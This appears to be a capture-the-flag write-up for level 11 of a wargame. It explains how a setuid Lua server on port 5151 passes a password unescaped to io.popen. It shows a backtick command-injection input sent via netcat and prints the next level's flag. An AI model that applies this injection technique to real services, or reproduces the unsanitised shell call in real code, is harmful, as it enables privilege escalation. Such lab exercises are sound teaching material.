# Level 11 - Lua ? Erf nope..

## Home Content

- The home folder contain a Lua script named `level11.lua``` owned by `flag11`.
- SETUID and SETGID bits are set.

```sh
$ ls -al
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
$
```

## The Lua Script Code

- The script creates a server listening on port 5151.
- It asks for a password.
- The sent password is then concatenated in a command line which is executed.

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  ...
end
```

- And the remaining code only serves to rudely dismiss us.

## Command Substitution

- By using the command substitution of `bash` (\`) we can let the script execute our favorite command, `getflag`.

```sh
$ level11@SnowCrash:~$ netcat 127.0.0.1 5151
Password: `getflag > /tmp/key`
```

# Flag

- `level12` password (flag): `fa6v5ateaw21peobuub8ipe6s`
